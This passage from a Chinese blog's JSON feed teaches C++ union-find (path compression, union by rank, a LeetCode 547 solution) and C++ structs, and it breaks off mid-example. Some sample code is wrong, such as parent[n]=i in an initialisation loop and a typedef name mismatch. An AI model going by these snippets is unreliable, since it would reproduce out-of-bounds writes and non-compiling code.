            "content_html": "<h1 id=\"c并查集\"><a class=\"anchor\" href=\"#c并查集\">#</a> C++ 并查集</h1>\n<h2 id=\"1并查集简介及构成\"><a class=\"anchor\" href=\"#1并查集简介及构成\">#</a> 1. 并查集简介及构成：</h2>\n<p>并查集是一种树型的数据结构，用于处理一些不相交集合的合并及查询问题。合并及查询即代表 &quot;并&quot; 和 &quot;查&quot;。</p>\n<p>并查集由一个整数数组 parent []，两个函数 find 和 connect 构成。</p>\n<p>parent [] 数组记录每一个元素的前驱节点是什么，find 用于查找指定元素属于哪个集合 (表现形式一般为查找该元素的根节点)，connect 用于连接两个集合 (表现形式一般为根节点不一样的两个元素)。</p>\n<p>构建并查集的命名可以和上述不同。比如 parent 可以根据实际意义改为 father,root 等等。find 一般不需要修改名称，因为在几乎所有的场景这个函数都代表查找的意思。connect 也可以叫 union 等等。</p>\n<p>并查集的主要作用是求连通分支数，比如无向图有多少连通分支，图中 A 和 B 两个顶点是否连通等。</p>\n<h2 id=\"2构建并查集\"><a class=\"anchor\" href=\"#2构建并查集\">#</a> 2. 构建并查集：</h2>\n<h3 id=\"21-数组初始化\"><a class=\"anchor\" href=\"#21-数组初始化\">#</a> 2.1 数组初始化：</h3>\n<p>一般情况数组 parent 初始化时将所有元素设为自己，但是也有特殊情况。比如各种岛屿包围的问题。具体情况要具体看。</p>\n<p>对于数据是 int 型元素构建并查集可以使用数组，但是有时我们要为字符串等其它类型元素构建并查集，因此很多时候需要使用哈希，即 unordered_map 来做数组存储。</p>\n<h3 id=\"22-find函数的构建\"><a class=\"anchor\" href=\"#22-find函数的构建\">#</a> 2.2 find 函数的构建：</h3>\n<p>find 作用是查找元素最前面的前驱元素。代码如下：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int find(int&amp; node,vector&lt;int&gt;&amp; parent)&#123;</span><br><span class=\"line\">    int q=node;</span><br><span class=\"line\">    while(parent[q]!=q)&#123;</span><br><span class=\"line\">        q=parent[q];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    return q;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码还是很好理解的。此时 find 复杂度最坏为 O (n)，平均为 O (logN)。</p>\n<h2 id=\"23-connect函数的构建\"><a class=\"anchor\" href=\"#23-connect函数的构建\">#</a> 2.3 connect 函数的构建：</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void connect(int&amp; node1,int&amp; node2,vector&lt;int&gt;&amp; parent)&#123;</span><br><span class=\"line\">    int root1=find(node1,parent);</span><br><span class=\"line\">    int root2=find(node2,parent);</span><br><span class=\"line\">    if(root1==root2)&#123;</span><br><span class=\"line\">        //两个元素属于同一顶点，已连通，无需作处理</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //两个元素不属于同一顶点，那么其中一个顶点的前驱节点变为另一个前驱节点。</span><br><span class=\"line\">    //一般情况下parent[root1]=root2和parent[root2]=root1没有太大区别，但是</span><br><span class=\"line\">    //有些情况可能只能parent[root1]=root2或parent[root2]=root1</span><br><span class=\"line\">    parent[root1]=root2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>connect 复杂度和 find 一样。因为调用了 2 次 find。</p>\n<h3 id=\"24-完整代码及举例\"><a class=\"anchor\" href=\"#24-完整代码及举例\">#</a> 2.4 完整代码及举例：</h3>\n<p>举一个简单的例子，参照下题：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> 给定n和vector&lt;vector&lt;int&gt;&gt; array,n代表有n个顶点，array每个元素均是长度为2的数组，</span><br><span class=\"line\">代表array[i][0]与array[1]连通。</span><br><span class=\"line\">如下：</span><br><span class=\"line\">3，&#123;&#123;1，2&#125;，&#123;0，1&#125;&#125;</span><br><span class=\"line\">代表3个顶点，1和2连通，0和1连通</span><br></pre></td></tr></table></figure></p>\n<p>构造完整并查集如下：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include&lt;vector&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"> </span><br><span class=\"line\">//这里省去n和array的初始化，如果是标准输入需要在主函数进行多组输入操作。</span><br><span class=\"line\">//如果是力扣的模式就无需这一步</span><br><span class=\"line\">int n;</span><br><span class=\"line\">vector&lt;vector&lt;int&gt;&gt; array;</span><br><span class=\"line\"> </span><br><span class=\"line\">int find(int&amp; node,vector&lt;int&gt;&amp; parent)&#123;</span><br><span class=\"line\">    int q=node;</span><br><span class=\"line\">    while(parent[q]!=q)&#123;</span><br><span class=\"line\">        q=parent[q];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    return q;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">void connect(int&amp; node1,int&amp; node2,vector&lt;int&gt;&amp; parent)&#123;</span><br><span class=\"line\">    int root1=find(node1,parent);</span><br><span class=\"line\">    int root2=find(node2,parent);</span><br><span class=\"line\">    if(root1==root2)&#123;</span><br><span class=\"line\">        //两个元素属于同一顶点，已连通，无需作处理</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //两个元素不属于同一顶点，那么其中一个顶点的前驱节点变为另一个前驱节点。</span><br><span class=\"line\">    //一般情况下parent[root1]=root2和parent[root2]=root1没有太大区别，但是</span><br><span class=\"line\">    //有些情况可能只能parent[root1]=root2或parent[root2]=root1</span><br><span class=\"line\">    parent[root1]=root2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">int main()&#123;</span><br><span class=\"line\">    vector&lt;int&gt; parent(n,0);</span><br><span class=\"line\">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class=\"line\">        //用自己初始化parent</span><br><span class=\"line\">        parent[n]=i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class=\"line\">        connect(array[i][0],array[i][1],parent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //构建完并查集的其它操作，如判断是不是同一个集合或者求集合数等等</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这种方式可以构建并查集。我们也可以构建一个类，让 parent 作成员变量，这样 find 和 connect 就不需要最后一个参数了。</p>\n<p>这种方式复杂度比较高，每次 connect 都需要平均 O (logN) 的复杂度。我们可以尝试优化 connect 的效率。</p>\n<h2 id=\"3优化\"><a class=\"anchor\" href=\"#3优化\">#</a> 3. 优化：</h2>\n<p>优化一般有两种方式，路径压缩和按秩合并。</p>\n<h3 id=\"31-路径压缩\"><a class=\"anchor\" href=\"#31-路径压缩\">#</a> 3.1 路径压缩：</h3>\n<p>路径压缩是压缩 find 函数的时间，它的核心思想是在寻找根节点后递归的把所有中间节点的前驱节点改为根节点，代码如下：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int find(int&amp; node,vector&lt;int&gt;&amp; parent)&#123;</span><br><span class=\"line\">    if(parent[node]!=node)&#123;</span><br><span class=\"line\">        parent[node]=find(parent[node],parent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return parent[node];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这种方式可以一定程度压缩 find 函数，使得第二次查找起复杂度均为 1，直到根节点下次更新。不过第一次的复杂度还是 n。</p>\n<p>单独使用路径压缩算法，每次 connect 的平均时间复杂度为 O (α(n))，最坏为 O (logN)。</p>\n<p>α(n) 为阿克曼函数的反函数，基本可以认为是常数，即便 n 取已知宇宙中包含的原子总数，α(n) 也不会超过 5，因此 α(n) 复杂度基本可以认为是 O (1)。</p>\n<h3 id=\"32-按秩合并\"><a class=\"anchor\" href=\"#32-按秩合并\">#</a> 3.2 按秩合并:</h3>\n<p>按秩合并主要处理 connect 函数。它的原理是先建立一个 parentSize 数组，parentSize [i] 表示以 i 为顶点的树的节点数或高度。我习惯使用高度。</p>\n<p>代码如下：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void connect(int&amp; node1,int&amp; node2,vector&lt;int&gt;&amp; parent,vector&lt;int&gt;&amp; parentSize)&#123;</span><br><span class=\"line\">    int root1=find(node1,parent);</span><br><span class=\"line\">    int root2=find(node2,parent);</span><br><span class=\"line\">    if(root1==root2)&#123;</span><br><span class=\"line\">        //两个元素属于同一顶点，已连通，无需作处理</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //两个元素不属于同一顶点，将高度低的根节点指向为高度高的</span><br><span class=\"line\">    if(parentSize[root1]&lt;parentSize[root2])&#123;</span><br><span class=\"line\">        parent[root1]=root2;</span><br><span class=\"line\">        parentSize[root2]=max(parentSize[root2],parentSize[root1]+1);</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    parent[root2]=root1;</span><br><span class=\"line\">    parentSize[root1]=max(parentSize[root1],parentSize[root2]+1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>单独这种方式最坏复杂度和平均复杂度均为 O (logN).</p>\n<h3 id=\"33-按秩合并和路径压缩结合\"><a class=\"anchor\" href=\"#33-按秩合并和路径压缩结合\">#</a> 3.3 按秩合并和路径压缩结合</h3>\n<p>我们可以在两个函数分别使用路径压缩和按秩合并，联合使用的最好和最坏复杂度均为 O (α(n))。</p>\n<h2 id=\"4例题\"><a class=\"anchor\" href=\"#4例题\">#</a> 4. 例题：</h2>\n<p>在力扣中我找到的最适合并查集的是第 547 题：力扣</p>\n<p>这道题其实不能完全体现并查集的优势，因为使用 DFS/BFS 的复杂度是 n<sup>2，而并查集的复杂度是 α(n)*n</sup>2。如果将题目改为给出任意两点判断是否连通并查集优势就体现出来了。</p>\n<p>解题代码如下：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    int find(int&amp; num,vector&lt;int&gt;&amp; father)&#123;</span><br><span class=\"line\">        if(father[num]!=num)&#123;</span><br><span class=\"line\">            father[num]=find(father[num],father);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return father[num];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    void connect(int&amp; num1,int&amp; num2,vector&lt;int&gt;&amp; father,vector&lt;int&gt;&amp; fatherSize)&#123;</span><br><span class=\"line\">        int root1=find(num1,father);</span><br><span class=\"line\">        int root2=find(num2,father);</span><br><span class=\"line\">        if(root1==root2)&#123;</span><br><span class=\"line\">            return;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if(fatherSize[root1]&lt;fatherSize[root2])&#123;</span><br><span class=\"line\">            father[root1]=root2;</span><br><span class=\"line\">            fatherSize[root2]=max(fatherSize[root2],fatherSize[root1]+1);</span><br><span class=\"line\">            return;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        father[root2]=root1;</span><br><span class=\"line\">        fatherSize[root1]=max(fatherSize[root1],fatherSize[root2]+1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    int findCircleNum(vector&lt;vector&lt;int&gt;&gt;&amp; isConnected) &#123;</span><br><span class=\"line\">        int len=isConnected.size();</span><br><span class=\"line\">        vector&lt;int&gt; father(len);</span><br><span class=\"line\">        vector&lt;int&gt; fatherSize(len,1);</span><br><span class=\"line\">        int i(0),j(0),t(0),n(len);</span><br><span class=\"line\">        for(i=0;i&lt;len;i++)&#123;</span><br><span class=\"line\">            father[i]=i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i=0;i&lt;len;i++)&#123;</span><br><span class=\"line\">            for(j=i+1;j&lt;len;j++)&#123;</span><br><span class=\"line\">                if(isConnected[i][j])&#123;</span><br><span class=\"line\">                    connect(i,j,father,fatherSize);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i=0;i&lt;len;i++)&#123;</span><br><span class=\"line\">            if(father[i]!=i)&#123;</span><br><span class=\"line\">                n-=1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/CPP%E7%BB%93%E6%9E%84%E4%BD%93/",
            "url": "https://mangpumo.github.io/2023/01/12/CPP%E7%BB%93%E6%9E%84%E4%BD%93/",
            "title": "CPP结构体",
            "date_published": "2023-01-11T16:26:29.000Z",
            "content_html": "<h1 id=\"c-结构体struct\"><a class=\"anchor\" href=\"#c-结构体struct\">#</a> C++ 结构体（struct）</h1>\n<h2 id=\"一-定义与声明\"><a class=\"anchor\" href=\"#一-定义与声明\">#</a> 一、定义与声明</h2>\n<h3 id=\"1-先定义结构体类型再单独进行变量定义\"><a class=\"anchor\" href=\"#1-先定义结构体类型再单独进行变量定义\">#</a> 1. 先定义结构体类型再单独进行变量定义</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int Code;</span><br><span class=\"line\">    char Name[20];</span><br><span class=\"line\">    char Sex;</span><br><span class=\"line\">    int Age;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">struct Student Stu;</span><br><span class=\"line\">struct Student StuArray[10];</span><br><span class=\"line\">struct Student *pStru;</span><br></pre></td></tr></table></figure></p>\n<p>结构体类型是 struct Student，因此，struct 和 Student 都不能省略。但实际上，我用 codeblocks 运行时，下面变量的定义，不加 struct 也是可以的。</p>\n<h3 id=\"2-紧跟在结构体类型说明之后进行定义\"><a class=\"anchor\" href=\"#2-紧跟在结构体类型说明之后进行定义\">#</a> 2. 紧跟在结构体类型说明之后进行定义</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int Code;</span><br><span class=\"line\">    char Name[20];</span><br><span class=\"line\">    char Sex;</span><br><span class=\"line\">    int Age;</span><br><span class=\"line\">&#125;Stu,StuArray[10],*pStu;</span><br></pre></td></tr></table></figure></p>\n<p>这种情况时，后面还可以再定义结构体变量。</p>\n<h3 id=\"3-在说明一个无名结构体变量的同时直接进行定义\"><a class=\"anchor\" href=\"#3-在说明一个无名结构体变量的同时直接进行定义\">#</a> 3. 在说明一个无名结构体变量的同时直接进行定义</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int Code;</span><br><span class=\"line\">    char Name[20];</span><br><span class=\"line\">    char Sex;</span><br><span class=\"line\">    int Age;</span><br><span class=\"line\">&#125;Stu,Stu[10],*pStu;</span><br></pre></td></tr></table></figure></p>\n<p>这种情况下，之后不能再定义其他变量。</p>\n<h3 id=\"4-使用typedef说明一个结构体变量之后再用新类名来定义变量\"><a class=\"anchor\" href=\"#4-使用typedef说明一个结构体变量之后再用新类名来定义变量\">#</a> 4. 使用 typedef 说明一个结构体变量之后再用新类名来定义变量</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">​</span><br><span class=\"line\">typedef struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int Code;</span><br><span class=\"line\">    char Name[20];</span><br><span class=\"line\">    char Sex;</span><br><span class=\"line\">    int Age;</span><br><span class=\"line\">&#125;student;</span><br><span class=\"line\">Student Stu,Stu[10],*pStu;</span><br></pre></td></tr></table></figure></p>\n<p>Student 是一个具体的结构体类型，唯一标识。这里不用再加 struct</p>\n<h3 id=\"5-使用new动态创建结构体变量\"><a class=\"anchor\" href=\"#5-使用new动态创建结构体变量\">#</a> 5. 使用 new 动态创建结构体变量</h3>\n<p>使用 new 动态创建结构体变量时，必须是结构体指针类型。访问时，普通结构体变量使用使用成员变量访问符 &quot;.&quot;，指针类型的结构体变量使用的成员变量访问符为 &quot;-&gt;&quot;。</p>\n<p><strong>注意：动态创建结构体变量使用后勿忘 delete。</strong><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">struct Student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int Code;</span><br><span class=\"line\">    char Name[20];</span><br><span class=\"line\">    char Sex;</span><br><span class=\"line\">    int Age;</span><br><span class=\"line\">&#125;Stu,StuArray[10],*pStu;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Student *s = new Student();  // 或者Student *s = new Student;</span><br><span class=\"line\">    s-&gt;Code = 1;</span><br><span class=\"line\">    cout&lt;&lt;s-&gt;Code;</span><br><span class=\"line\"></span><br><span class=\"line\">    delete s;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"二-结构体构造函数\"><a class=\"anchor\" href=\"#二-结构体构造函数\">#</a> 二、结构体构造函数</h2>\n<h3 id=\"三种结构体初始化方法\"><a class=\"anchor\" href=\"#三种结构体初始化方法\">#</a> 三种结构体初始化方法：</h3>\n<ul>\n<li>1. 利用结构体自带的默认构造函数</li>\n<li>2. 利用带参数的构造函数</li>\n<li>3. 利用默认无参的构造函数</li>\n</ul>\n<p><strong>要点</strong>：什么都不写就是使用的结构体自带的默认构造函数，如果自己重写了带参数的构造函数，初始化结构体时如果不传入参数会出现错误。在建立结构体数组时，如果只写了带参数的构造函数将会出现数组无法初始化的错误！！！下面是一个比较安全的带构造的结构体示例<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct node&#123;</span><br><span class=\"line\">    int data;</span><br><span class=\"line\">    string str;</span><br><span class=\"line\">    char x;</span><br><span class=\"line\">    //注意构造函数最后这里没有分号哦！</span><br><span class=\"line\">  node() :x(), str(), data()&#123;&#125; //无参数的构造函数数组初始化时调用</span><br><span class=\"line\">  node(int a, string b, char c) :data(a), str(b), x(c)&#123;&#125;//有参构造</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//结构体数组声明和定义</span><br><span class=\"line\">struct node&#123;</span><br><span class=\"line\">    int data;</span><br><span class=\"line\">    string str;</span><br><span class=\"line\">    char x;</span><br><span class=\"line\">    //注意构造函数最后这里没有分号哦！</span><br><span class=\"line\">  node() :x(), str(), data()&#123;&#125; //无参数的构造函数数组初始化时调用</span><br><span class=\"line\">  node(int a, string b, char c) :data(a), str(b), x(c)&#123;&#125;//初始化列表进行有参构造</span><br><span class=\"line\">&#125;N[10];</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"三-结构体嵌套\"><a class=\"anchor\" href=\"#三-结构体嵌套\">#</a> 三、结构体嵌套</h2>\n<p>正如一个类的对象可以嵌套在另一个类中一样，一个结构体的实例也可以嵌套在另一个结构体中。例如，来看以下声明：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Costs</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    double wholesale;</span><br><span class=\"line\">    double retail;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct Item</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    string partNum;</span><br><span class=\"line\">    string description;</span><br><span class=\"line\">    Costs pricing;</span><br><span class=\"line\">&#125;widget;</span><br></pre></td></tr></table></figure></p>\n<p>Costs 结构体有两个 double 类型成员，wholesale 和 retail。Item 结构体有 3 个成员，前 2 个是 partNum 和 description，它们都是 string 对象。第 3 个是 pricing，它是一个嵌套的 Costs 结构体。如果定义了一个名为 widget 的 Item 结构体，则图 3 说明了其成员。</p>\n<p><img data-src=\"https://upload-images.jianshu.io/upload_images/4070621-dece9e95d9fdc33d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400/format/webp\" alt></p>\n<p>嵌套结构体访问的方式：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">widget.partnum = &quot;123A&quot;;</span><br><span class=\"line\">widget.description = &quot;iron widget&quot;;</span><br><span class=\"line\">widget.pricing.wholesale = 100.0;</span><br><span class=\"line\">widget.pricing.retail = 150.0;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"四-结构体赋值与访问\"><a class=\"anchor\" href=\"#四-结构体赋值与访问\">#</a> 四、结构体赋值与访问</h2>\n<ul>\n<li>赋值</li>\n</ul>\n<p>初始化结构体变量成员的最简单的方法是使用初始化列表。初始化列表是用于初始化一组内存位置的值列表。列表中的项目用逗号分隔并用大括号括起来。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Date</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int day, month, year;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>该声明定义 birthday 是一个 Date 结构体的变量，大括号内的值按顺序分配给其成员。所以 birthday 的数据成员已初始化，如图 2 所示。</p>\n<p><img data-src=\"https://upload-images.jianshu.io/upload_images/4070621-20ccb4470e86cf05.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/250/format/webp\" alt></p>\n<p>也可以仅初始化结构体变量的部分成员。例如，如果仅知道要存储的生日是 8 月 23 日， 但不知道年份，则可以按以下方式定义和初始化变量：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Date birthday = &#123;23,8&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>这里只有 day 和 month 成员被初始化，year 成员未初始化。但是，如果某个结构成员未被初始化，则所有跟在它后面的成员都需要保留为未初始化。使用初始化列表时，C++ 不提供跳过成员的方法。以下语句试图跳过 month 成员的初始化。这是不合法的。</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Date birthday = &#123;23,1983&#125;; 